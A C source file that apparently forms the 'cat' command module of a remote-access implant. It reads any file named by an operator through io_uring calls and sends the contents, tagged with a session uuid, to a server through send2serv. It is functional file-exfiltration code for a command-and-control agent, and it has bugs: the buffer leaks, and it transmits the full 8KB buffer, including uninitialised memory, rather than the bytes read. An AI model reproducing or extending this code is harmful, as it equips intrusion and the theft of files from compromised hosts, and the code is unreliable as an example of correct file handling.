#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <time.h>
#include <liburing.h>
#include "functions/send/send2serv.h"

void cmd_cat(struct io_uring *ring, int sockfd, const char *uuid, const char *input) {
    size_t buffer_size = 8192; // Start with 8KB
    char *output_buffer = malloc(buffer_size);

    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int fd, ret;
    off_t offset = 0;
    size_t total = 0;

    sqe = io_uring_get_sqe(ring);
    io_uring_prep_openat(sqe, AT_FDCWD, input, O_RDONLY, 0); //AT_FDCWD may show an error, but it does work. It's imported from liburing, so no need to import fcntl.h
    io_uring_submit(ring);
    io_uring_wait_cqe(ring, &cqe);
    fd = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    if (fd < 0) {
        char error_msg[256];
        snprintf(error_msg, sizeof(error_msg), "Cannot access '%s': No such file/directory OR invalid permissions\n", input);
        send2serv(uuid, error_msg, strlen(error_msg));
        return;
    }

    while (total < buffer_size - 1) {
        sqe = io_uring_get_sqe(ring);
        io_uring_prep_read(sqe, fd, output_buffer + total, buffer_size - 1 - total, offset);
        io_uring_submit(ring);
        io_uring_wait_cqe(ring, &cqe);
        ret = cqe->res;
        io_uring_cqe_seen(ring, cqe);
        if (ret <= 0) break;
        offset += ret;
        total += ret;
    }

    output_buffer[total] = 0;
    close(fd);
    send2serv(uuid, output_buffer, buffer_size);
}